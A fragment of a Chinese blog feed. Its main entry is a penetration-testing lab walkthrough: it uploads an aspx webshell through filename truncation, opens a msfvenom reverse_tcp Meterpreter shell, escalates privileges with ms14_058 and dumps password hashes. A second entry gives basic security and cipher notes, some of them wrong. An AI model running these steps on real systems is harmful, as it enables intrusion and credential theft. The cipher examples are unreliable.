10^6 来模拟 18 位或 6 位的小数。</p></li><li><p>Wei &#x3D; 1</p></li><li><p>Gwei &#x3D; 1e9 &#x3D; 1000000000</p></li><li><p>ether &#x3D; 1e18 &#x3D; 100000000000000000</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】渗透测试过程1</title>
      <link href="/2024/11/06/penetration_testing_steps/"/>
      <url>/2024/11/06/penetration_testing_steps/</url>
      
        <content type="html"><![CDATA[<h2 id="1-设置网络环境"><a href="#1-设置网络环境" class="headerlink" title="1. 设置网络环境"></a>1. 设置网络环境</h2><ul><li><p>将 Kali 虚拟机和靶机的网络适配器改为<strong>桥接模式</strong>。</p></li><li><p>在 Kali 虚拟机和靶机相互 ping 通，确保网络连通性。</p></li><li><p>切换到 <code>root</code> 模式进行操作。</p></li><li><p>Nmap（用于信息收集 资产探测：ip存活、系统、软件、软件版本、端口）</p></li><li><p><strong>扫描网段</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.42.0/24</span><br></pre></td></tr></table></figure><blockquote><p>查看网段中存活的主机。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/rWMvxBAIFEKR2sj.png" alt="1.png"></p></li><li><p><strong>全面扫描靶机</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在本实验获取数据库端口（1433）。</p></blockquote></li><li><p><strong>判断系统类型</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>running:</code> 后面查看主机系统信息。</p></blockquote><p>【图片2】</p></li><li><p><strong>服务版本扫描(运行软件）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/wKv9uQmBhrnHEVf.png" alt="3.png"></p></li><li><p><strong>端口扫描</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 (目标端口)&lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/zKij7s6kvE9Nclt.png" alt="4.png"></p></li><li><p><strong>端口 27689 测试</strong>：扫描出异常(unknown）端口，在浏览器访问 <code>&lt;靶机IP&gt;:27689</code>。<br><img src="https://s2.loli.net/2024/11/06/ZXolz7xJqILSc2m.png" alt="5.png"></p></li><li><p><strong>随机 IP 扫描</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -iR(随机) &lt;数量&gt; -Pn -p 80</span><br></pre></td></tr></table></figure><blockquote><p>如果对方开了防火墙——（报）filtered http</p></blockquote></li></ul><h2 id="3-目录结构探测-使用-Dirsearch获取"><a href="#3-目录结构探测-使用-Dirsearch获取" class="headerlink" title="3. 目录结构探测 - 使用 Dirsearch获取"></a>3. 目录结构探测 - 使用 Dirsearch获取</h2><ul><li><p><strong>安装 Dirsearch</strong>，用于获取网站目录结构（取决于字典）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://&lt;靶机IP&gt;:27689/ -I 200,302</span><br></pre></td></tr></table></figure><blockquote><p>200 和 302 表示返回的状态码。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/1QB9OferEtkwIKi.png" alt="6.png"></p></li><li><p><strong>逐步访问上述图片获取的文件</strong>，在浏览器输入 <code>http://&lt;靶机IP&gt;:27689/&lt;文件名&gt;</code>。</p></li><li><p><strong>在访问 <code>web.config.bak</code></strong> 文件，得到数据库信息：</p><ul><li>数据库 IP：192.168.61.144</li><li>数据库名称：FileManage</li><li>用户名：down</li><li>密码：downsql</li></ul><p><img src="https://s2.loli.net/2024/11/06/ADWEqnZHh2kGCrK.png" alt="7.png"></p></li></ul><h2 id="4-数据库连接-使用-Navicat-连接"><a href="#4-数据库连接-使用-Navicat-连接" class="headerlink" title="4. 数据库连接 - 使用 Navicat 连接"></a>4. 数据库连接 - 使用 Navicat 连接</h2><ul><li>下载并安装 Navicat，使用上述数据库信息进行登录。</li><li>若连接不上，可以将 Navicat 通过 FTP 安装到虚拟机。</li></ul><p><img src="https://s2.loli.net/2024/11/06/lJZtYUFH7S8gmAh.png" alt="8.png"></p><h2 id="5-网站管理"><a href="#5-网站管理" class="headerlink" title="5. 网站管理"></a>5. 网站管理</h2><ul><li>回到网站 <code>&lt;靶机IP&gt;:27689</code>，在用户管理模块进行操作。（登入——用户管理——管理用户）</li></ul><p><img src="https://s2.loli.net/2024/11/06/WCcwqFVEDkRtjPZ.png" alt="9.png"></p><h2 id="6-上传一句话木马"><a href="#6-上传一句话木马" class="headerlink" title="6. 上传一句话木马"></a>6. 上传一句话木马</h2><ul><li><p><strong>生成一句话木马文件</strong>，在网站下载管理模块上传文件：</p><p>文件命名为 <code>aaaaaaaaa.aspx.jpg</code>（利用文件名过长被截断的特性，上传后网站删除.jpg）。</p></li></ul><p> <img src="https://s2.loli.net/2024/11/06/opBKA5PW2vECmrj.png" alt="10.png"></p><p>  <strong>上传成功后，一访问就下载：无法解析函数</strong></p><p><img src="https://s2.loli.net/2024/11/06/hSrokxYIA3M9mbW.png" alt="11.png"></p><ul><li><p><strong>获取文件绝对路径</strong>：通过访问不存在的文件查看报错，找到路径 <code>/upfile/affix/</code>。</p><p><img src="https://s2.loli.net/2024/11/06/yjicEPLAVgN49XC.png" alt="12.png"></p></li></ul><h2 id="7-连接木马"><a href="#7-连接木马" class="headerlink" title="7. 连接木马"></a>7. 连接木马</h2><ul><li>使用蚁剑连接上传的 <code>aspx</code> 文件。</li></ul><p><img src="https://s2.loli.net/2024/11/06/vUEJeHn8ab2zCWP.png" alt="13.png"></p><h2 id="8-生成并上传-MSF-木马"><a href="#8-生成并上传-MSF-木马" class="headerlink" title="8. 生成并上传 MSF 木马"></a>8. 生成并上传 MSF 木马</h2><ul><li><p><strong>生成 MSF 木马</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;靶机IP&gt; LPORT=6666 -f exe -o 123.exe</span><br></pre></td></tr></table></figure><blockquote><p>IP 是 Kali 虚拟机的 IP 地址。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/m6qtV2A7cTfrI3x.png" alt="14.png"></p></li><li><p><strong>启动监听器</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;靶机IP&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/9zgmlPdetZsCfGH.png" alt="15.png"></p></li></ul><p> <strong>将木马的exe文件从kali复制到主机，然后上传到蚁剑对应位置</strong></p><blockquote><p>（进入&#x2F;web&#x2F;upfile&#x2F;affix&#x2F;，右键上传）</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/B8vSMlg4dXVpGsE.png" alt="16.png"></p><ul><li><p><strong>启动木马文件</strong>：</p><blockquote><p>右键⽊⻢⽂件，打开终端 输⼊如下命令 </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> 123.exe</span><br></pre></td></tr></table></figure><blockquote><p>如果成功，Kali 会成功上线（回到kali终端查看）。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/4eorftv6HnB2cOE.png" alt="17.png"></p><blockquote><p>发现kali成功上线后 可查看到run的执⾏结果（如下图） </p></blockquote><p><img src="https://s2.loli.net/2024/11/06/sypAoLET8I5rSOe.png" alt="18.png"></p><blockquote><p>它⾃动的为我们匹配出了⼀些可能的⽤于易受攻击⽬标提权的漏洞利⽤模块</p></blockquote></li></ul><h2 id="9-提权操作"><a href="#9-提权操作" class="headerlink" title="9. 提权操作"></a>9. 提权操作</h2><ul><li><p>使用以下命令检查提权模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bg</span></span><br><span class="line">sessions</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/yKlRjuSf4AieIZG.png" alt="19.png"></p></li><li><p><strong>提权操作</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.loli.net/2024/11/06/jw1dgqrkM6vGfKQ.png" alt="20.png"></p><ul><li><p>搜索并利用提权漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms14_058</span><br><span class="line">use exploit/windows/local/ms14_058_track_popup_menu</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/Q1njzmoOYVRHAli.png" alt="21.png"></p></li><li><p><strong>检查权限</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/qz1U6ZSgwWohAct.png" alt="22.png"></p></li></ul><blockquote><p>发现已经是最高权限</p></blockquote><h2 id="10-持久化攻击"><a href="#10-持久化攻击" class="headerlink" title="10. 持久化攻击"></a>10. 持久化攻击</h2><ul><li>获取 <code>administrator</code> 密码：<ul><li>使用 <code>hashdump</code> 模块提取密码 hash。<br><img src="https://s2.loli.net/2024/11/06/HlzGqJRjFn2x6pD.png" alt="23.png"><br><img src="https://s2.loli.net/2024/11/06/fOcRn4DyW9VLjsE.png" alt="24.png"><blockquote><p>已经可以看到相关账户密码加密后的hash了 </p></blockquote></li><li>将 hash 上传至 <a href="https://www.cmd5.com/">cmd5.com</a> 进行解密，得到密码为 <code>admin123</code>。<br><img src="https://s2.loli.net/2024/11/06/SCmG1Bs2thUEuVy.png" alt="25.png"></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础一</title>
      <link href="/2024/10/30/%E9%93%BE%E5%AE%891/"/>
      <url>/2024/10/30/%E9%93%BE%E5%AE%891/</url>
      
        <content type="html"><![CDATA[<h5 id="关键词：信息安全-网络安全-（非）对称加密-密钥管理技术"><a href="#关键词：信息安全-网络安全-（非）对称加密-密钥管理技术" class="headerlink" title="关键词：信息安全  网络安全  （非）对称加密   密钥管理技术"></a>关键词：信息安全  网络安全  （非）对称加密   密钥管理技术</h5><h2 id="一-信息安全知识基础"><a href="#一-信息安全知识基础" class="headerlink" title="一. 信息安全知识基础"></a>一. 信息安全知识基础</h2><h3 id="1-1-信息安全定义-特征"><a href="#1-1-信息安全定义-特征" class="headerlink" title="1.1 信息安全定义&amp;特征"></a>1.1 信息安全定义&amp;特征</h3><h4 id="1-1-1信息安全的定义："><a href="#1-1-1信息安全的定义：" class="headerlink" title="1.1.1信息安全的定义："></a>1.1.1信息安全的定义：</h4><p>​a. 信息系统的安全（也称实体安全，系统运行的安全）</p><p>​b. 特定信息体系的安全</p><ul><li>系统中信息的安全（用户权限的限制，数据加密）</li><li>管理安全（对信息资源和系统运行的管理）</li></ul><h4 id="1-1-2信息安全的特征"><a href="#1-1-2信息安全的特征" class="headerlink" title="1.1.2信息安全的特征"></a><span style="color: red;">1.1.2信息安全的特征</span></h4><p><strong>a. 保密性</strong></p><p><strong>b. 完整性</strong></p><p><strong>c. 可用性</strong></p><p><strong>d. 可控性</strong></p><p><strong>e. 可审查性</strong></p><h4 id="关于五种特征的解释："><a href="#关于五种特征的解释：" class="headerlink" title="关于五种特征的解释："></a>关于五种特征的解释：</h4><p>（1）保密性：保密性是指信息<span style="color: blue;">不泄漏给非授权的个人、实体和过程，或供其使用的特性。</span><br>（2）完整性：完整性是指信息<span style="color: blue;">未经授权不能被修改、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。</span>对网络信息安全进行攻击其最终目的就是破坏信息的完整性。<br>（3） 可用性：可用性是指合法用户访问并能<span style="color: blue;">按要求顺序使用信息的特性</span>，即保证合法用户在需要时可以访问到信息及相关资产。<br>（4）可控性：可控性是指授权机构<span style="color: blue;">对信息的内容及传播具有控制能力的特性</span>，可以控制授权范围内的信息流向以及方式。<br>（5）可审查性（抗抵赖性）：在信息交流过程结束后，通信双方<span style="color: blue;">不能抵赖曾经做出的行为，也不能否认曾经接收到对方的信息。</span></p><h3 id="1-2-网络安全的定义-特征"><a href="#1-2-网络安全的定义-特征" class="headerlink" title="1.2 网络安全的定义&amp;特征"></a>1.2 网络安全的定义&amp;特征</h3><h5 id="1-2-1-网安定义"><a href="#1-2-1-网安定义" class="headerlink" title="1.2.1 网安定义"></a>1.2.1 网安定义</h5><p>a. 硬件安全</p><p>b. 软件安全</p><p>c.系统中数据的安全</p><h5 id="1-2-2网安特征"><a href="#1-2-2网安特征" class="headerlink" title="1.2.2网安特征"></a>1.2.2网安特征</h5><p>a.保密性</p><p>b.完整性</p><p>c.可用性</p><p>d.可控性</p><h3 id="1-3-网络信息安全技术需求"><a href="#1-3-网络信息安全技术需求" class="headerlink" title="1.3 网络信息安全技术需求"></a>1.3 网络信息安全技术需求</h3><h5 id="1-3-1-网络物理安全（实体安全）"><a href="#1-3-1-网络物理安全（实体安全）" class="headerlink" title="1.3.1 网络物理安全（实体安全）"></a>1.3.1 网络物理安全（实体安全）</h5><p>​指所有支持网络系统运行的硬件总体安全。</p><p>​物理安全的需求主要有：</p><ul><li>环境安全</li><li>设备安全（物理防备）</li><li>媒体安全（媒体数据&amp;媒体本身）</li></ul><h5 id="1-3-2网络认证"><a href="#1-3-2网络认证" class="headerlink" title="1.3.2网络认证"></a>1.3.2网络认证</h5><p>​定义：实现网络资源访问控制的前提和依据。</p><p>​作用：标识，鉴别网络资源访问者身份的真实性</p><h5 id="1-3-3-网络访问控制"><a href="#1-3-3-网络访问控制" class="headerlink" title="1.3.3 网络访问控制"></a>1.3.3 网络访问控制</h5><p>​网络访问控制是有效保护网络管理对象，使其免受关键技术方法。其目标主要有两个：<br>​（1）限制非法用户获取或使用网络资源。<br>​（2） 防止合法用户滥用权限，越权访问网络资源。</p><h5 id="1-3-4网络安全保密"><a href="#1-3-4网络安全保密" class="headerlink" title="1.3.4网络安全保密"></a>1.3.4网络安全保密</h5><p>​目的： 就是防止非授权的用户访问网上信息或网络设备。</p><p>​为此，重要的网络物理实体能够采用辐射干扰机技术，防止通过电磁辐射泄露机密信息。</p><h5 id="1-3-5网络安全监测"><a href="#1-3-5网络安全监测" class="headerlink" title="1.3.5网络安全监测"></a>1.3.5网络安全监测</h5><p>​作用： 发现系统入侵活动和检查安全保护措施的有效性，以便及时报警给网安管理员</p><h5 id="1-3-6网络漏洞评估"><a href="#1-3-6网络漏洞评估" class="headerlink" title="1.3.6网络漏洞评估"></a>1.3.6网络漏洞评估</h5><p>​作用： 扫描弱点&amp;漏洞</p><h5 id="1-3-7-防范网络恶意代码"><a href="#1-3-7-防范网络恶意代码" class="headerlink" title="1.3.7 防范网络恶意代码"></a>1.3.7 防范网络恶意代码</h5><h5 id="1-3-8-网络安全应急响应"><a href="#1-3-8-网络安全应急响应" class="headerlink" title="1.3.8 网络安全应急响应"></a>1.3.8 网络安全应急响应</h5><h5 id="1-3-9-网络安全体系"><a href="#1-3-9-网络安全体系" class="headerlink" title="1.3.9 网络安全体系"></a>1.3.9 网络安全体系</h5><p>​网络安全的实现不仅仅取决于某项技术，而是依赖于一个网络信息安全体系的建立，这个体系包括安全组织机构、安全制度、安全管理流程、安全人员意识等。通过安全体系的建立，可以在最大程度上实现网络的整体安全，满足企业或单位安全发展的要求。</p><h5 id="1-4-信息安全策略"><a href="#1-4-信息安全策略" class="headerlink" title="1.4 信息安全策略"></a>1.4 信息安全策略</h5><ul><li>物理安全</li><li>访问控制</li><li>防火墙</li><li>信息加密</li><li>网络安全管理</li></ul><h5 id="1-5-相关法律"><a href="#1-5-相关法律" class="headerlink" title="1.5 相关法律"></a>1.5 相关法律</h5><h2 id="二-密码学基础"><a href="#二-密码学基础" class="headerlink" title="二. 密码学基础"></a>二. 密码学基础</h2><h3 id="2-1-密码基本知识"><a href="#2-1-密码基本知识" class="headerlink" title="2.1 密码基本知识"></a>2.1 密码基本知识</h3><p><img src="https://s2.loli.net/2024/11/03/56aczxuvg3BOFyU.jpg" alt="1.jpg"></p><h3 id="2-2-古典密码体制"><a href="#2-2-古典密码体制" class="headerlink" title="2.2 古典密码体制"></a>2.2 古典密码体制</h3><h4 id="2-2-1-单表密码"><a href="#2-2-1-单表密码" class="headerlink" title="2.2.1 单表密码"></a>2.2.1 单表密码</h4><p>（仅个人兴趣列出 非必须掌握）</p><ul><li><strong>凯撒密码</strong></li></ul><p>该算法表示为： </p><p><img src="https://s2.loli.net/2024/11/03/lOFKSTxvZR8siun.jpg" alt="2.jpg"></p><p>（c代表密文，p代表明文）</p><ul><li><p><strong>仿射密码</strong></p><p>仿射密码的主要特点是使用一个线性函数进行加密和解密。</p><p>加密过程：</p><p>在仿射密码中，字符通过以下公式进行加密：</p><p>E(x)&#x3D;(ax+b) mod  m </p><ul><li><p>E(x)：加密后的字符</p></li><li><p>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</p></li><li><p>a 和 b：密钥，其中 a必须与字母表的大小 m <strong>互质</strong></p></li><li><p>m：字母表的大小（例如，对于英文字母，m&#x3D;26）</p></li></ul><p>假设我们选择 a&#x3D;5 和 b&#x3D;8，加密字母 “C”：</p><ol><li><p>C 的位置 x&#x3D;2</p></li><li><p>加密：E(2)&#x3D;(5⋅2+8)mod  26&#x3D;18</p></li><li><p>对应字母为 “S”</p></li></ol></li><li><p><strong>乘法密码</strong></p><p>加密公式为：</p><p>E(x)&#x3D;(a⋅x)mod  m</p><ul><li>E(x)：加密后的字符</li><li>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</li><li>a：密钥，且必须与字母表的大小 m 互质</li><li>m：字母表的大小（对于英文字母，m&#x3D;26）</li></ul></li><li><p><strong>密钥词组密码</strong></p></li></ul><h6 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><h6 id="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"><a href="#选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。" class="headerlink" title="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"></a><strong>选择密钥词组</strong>：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。</h6><p>例如，如果选择的密钥词组是 “SECURITY”，则变为 “SECURIT”（去掉重复的 “I”）。</p></li><li><h6 id="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"><a href="#生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。" class="headerlink" title="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"></a><strong>生成替代字母表</strong>：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。</h6><ul><li><p>密钥字母：S E C U R I T</p></li><li><p>剩余字母：A B D F G H J K L M N O P Q V W X Y Z</p></li><li><p>生成的替代字母表：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">S</span> <span class="built_in">E</span> <span class="built_in">C</span> <span class="variable">U</span> <span class="variable">R</span> <span class="built_in">I</span> <span class="variable">T</span> <span class="variable">A</span> <span class="variable">B</span> <span class="built_in">D</span> <span class="variable">F</span> <span class="variable">G</span> <span class="variable">H</span> <span class="variable">J</span> <span class="built_in">K</span> <span class="variable">L</span> <span class="variable">M</span> <span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">P</span> <span class="variable">Q</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Y</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>加密文本</strong>：用原字母表的字母替换为替代字母表中的字母。</p></li></ol><h4 id="2-2-2-多表密码"><a href="#2-2-2-多表密码" class="headerlink" title="2.2.2 多表密码"></a>2.2.2 多表密码</h4><p>2.2.2.1<strong>普拉斐尔密码</strong></p><h6 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><p><strong>选择密钥</strong>：选择一个密钥词（例如 “PLAYFAIR”），去掉重复字母并将其填入一个5x5的矩阵中。</p></li><li><p><strong>填充矩阵</strong>：在密钥的基础上，依次填入剩余字母（通常将 “I” 和 “J” 合并为一个字母，矩阵中只使用一个）。</p><p>例如，使用 “PLAYFAIR” 作为密钥，矩阵为：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">P</span> <span class="variable">L</span> <span class="variable">A</span> <span class="variable">Y</span> <span class="variable">F</span></span><br><span class="line"><span class="built_in">I</span> <span class="variable">R</span> <span class="variable">B</span> <span class="built_in">C</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">E</span> <span class="variable">G</span> <span class="variable">H</span> <span class="built_in">K</span> <span class="variable">M</span></span><br><span class="line"><span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">Q</span> <span class="variable">S</span> <span class="variable">T</span></span><br><span class="line"><span class="variable">U</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li><li><p><strong>准备明文</strong>：将明文按两两分组。如果有重复的字母，插入一个填充字母（通常使用 “X”）。如果最后一组只有一个字母，则在其后添加一个填充字母。</p><p>例如，明文 “HELLO” 变为 “HE LL OX”（分组为 “HE”, “LX”, “OX”）。</p></li><li><p><strong>加密规则</strong>：</p><ul><li><strong>同列</strong>：如果两个字母在同一列中，则用其下方的字母替换（循环回到顶部）。</li><li><strong>同行</strong>：如果两个字母在同一行中，则用其右边的字母替换（循环回到左边）。</li><li><strong>不同行不列</strong>：如果两个字母在矩阵的不同位置，形成一个矩形，则用矩形的对角字母替换。</li></ul><p>例如，加密 “HE”：</p><ul><li>H(第3行第3列) 和 E(第3行第1列) 形成一个矩形，加密为 “BK”。</li></ul></li><li><p><strong>重复上述步骤</strong>：对所有分组进行加密。</p><h6 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相反，使用相同的矩阵和规则：</p><ul><li><strong>同列</strong>：用上方的字母替换。</li><li><strong>同行</strong>：用左边的字母替换。</li><li><strong>不同行不列</strong>：用矩形的对角字母替换。</li></ul></li></ol><p>2.2.2.2 <strong>维吉尼亚密码</strong></p><h6 id="加密过程-2"><a href="#加密过程-2" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><p><strong>选择关键词</strong>：选择一个关键词（例如 “KEY”），并将其重复直到与明文长度相同。</p></li><li><p><strong>明文和关键词对齐</strong>：将明文与关键词字符逐一对齐。</p><p>例如，明文为 “HELLO WORLD”，关键词为 “KEY”，对齐后：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">H</span> <span class="built_in">E</span> <span class="variable">L</span> <span class="variable">L</span> <span class="built_in">O</span>   <span class="variable">W</span> <span class="built_in">O</span> <span class="variable">R</span> <span class="variable">L</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span>   <span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/03/bHRra7AINk1tPdD.png" alt="3.png"></p></li></ol><h6 id="解密过程-1"><a href="#解密过程-1" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相似，但公式反转：</p><p><img src="https://s2.loli.net/2024/11/03/q1U9GD8TaLpnvcu.png" alt="4.png"></p><h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h6><p>假设明文为 “HELLO WORLD”，关键词为 “KEY”：</p><ol><li><strong>重复关键词</strong>：将 “KEY” 重复，得到 “KEYKEYKEYK”。</li><li><strong>对齐并加密</strong>：<ul><li>H (7) + K (10) &#x3D; R (17)</li><li>E (4) + E (4) &#x3D; I (8)</li><li>L (11) + Y (24) &#x3D; J (9)</li><li>L (11) + K (10) &#x3D; V (21)</li><li>O (14) + E (4) &#x3D; S (18)</li><li>空格不加密</li><li>W (22) + K (10) &#x3D; G (6)</li><li>O (14) + E (4) &#x3D; S (18)</li><li>R (17) + Y (24) &#x3D; P (15)</li><li>L (11) + K (10) &#x3D; V (21)</li><li>D (3) + E (4) &#x3D; H (7)</li></ul></li></ol><p>最终加密结果为 “RIJVS GSPVH”。</p><p>2.2.2.3 <strong>希尔密码</strong></p><p><img src="https://s2.loli.net/2024/11/03/Cq2mW3LQolaReDz.png" alt="5.png"></p><h3 id="2-3-现代密码体制"><a href="#2-3-现代密码体制" class="headerlink" title="2.3 现代密码体制"></a>2.3 现代密码体制</h3><h4 id="2-3-1-对称密码体制"><a href="#2-3-1-对称密码体制" class="headerlink" title="2.3.1 对称密码体制"></a>2.3.1 对称密码体制</h4><p>加密解密用同一把密钥 or 两把密钥之间可以推理出来</p><p><span style = "color: red;">对称加密算法的优点：</span></p><ol><li><span style = "color: red;">加，解密处理速度快</span></li><li><span style = "color: red;">保密度高</span></li></ol><p><span style = "color: red;">对称加密算法的缺点：</span></p><ol><li><span style = "color: red;">密钥分发困难</span></li><li><span style = "color: red;">密钥管理困难</span></li></ol><p><strong>举例：</strong></p><p>数据加密标准(DES)算法：</p><p><img src="https://s2.loli.net/2024/11/03/N4viyfzdRVm5ehU.jpg" alt="6.jpg"></p><p><img src="https://s2.loli.net/2024/11/03/71Kphrfctyk2iWJ.jpg" alt="7.jpg"></p><p>DES算法特点：<br>（1）分组加密算法：以64位为分组，64位一组明文输入，<br>64位密文输出。<br>（2） 对称算法：加密和解密用同一密钥。<br>（3）有效密钥长度为56位：密钥通常表示为64位数，但每个第8位都用作奇偶校验，可以忽略。<br>（4）代替和置换：DES算法是两种加密技术的组合，先代替后置换。<br>（5） 易于实现：DES算法只是使用了标准的算术和逻辑运算，其作用的数最多也只有64位，并且，算法的重复特性使得它可以非常理想地在一个专用芯片中实现</p><p><strong><span style = "color: orange;">2.3.2 非对称密码体制</span></strong></p><p>加密解密用不同密钥 or 两把密钥之间很难推理出来</p><p><span style = "color: red;">非对称加密算法的优点：</span></p><pre><code> 1. &lt;span style = &quot;color: red;&quot;&gt;密钥分发简单&lt;/span&gt; 2. &lt;span style = &quot;color: red;&quot;&gt;密钥管理便捷&lt;/span&gt; 3. &lt;span style = &quot;color: red;&quot;&gt;可以实现签名&lt;/span&gt;</code></pre><p><span style = "color: red;">非对称加密算法的缺点：</span></p><ol><li><span style = "color: red;">加密解密处理速度较慢</span></li><li><span style = "color: red;">同等安全强度下公钥密码体制的密钥位数要求多一些</span></li></ol><p><strong>举例：</strong></p><ul><li>RSA密钥生成原理</li><li>EIGamal公钥密码技术</li><li>椭圆曲线密码技术</li></ul><p>[具体解释等如果到时候我再遇到就去查了补充在这里QwQ]</p><h2 id="三-密钥管理技术"><a href="#三-密钥管理技术" class="headerlink" title="三.密钥管理技术"></a>三.密钥管理技术</h2><p><img src="https://s2.loli.net/2024/11/03/fAnc8R6hPg4VpGx.png" alt="8.png"></p><p><strong>一个完整的保密通信系统</strong></p><p>由</p><ol><li><p>密码体制（密码算法，及所有的明文，密文和密钥）</p></li><li><p>信源</p></li><li><p>信宿</p></li><li><p>攻击者</p></li></ol><p>构成。</p><p>  加解密算法一般都是公开的，所有的密码技术都依赖于密钥。当密码算法确定后，密码系统的保密程度就完全取决于密钥的保密程度。</p><p><strong>密钥管理定义</strong></p><p>密钥管理涉及密钥的产生和存储、分发、使用、更新（替换）、备份和恢复、以及撤销和销毁等，涵盖了密钥的整个生存周期。</p><h5 id="密钥管理目的"><a href="#密钥管理目的" class="headerlink" 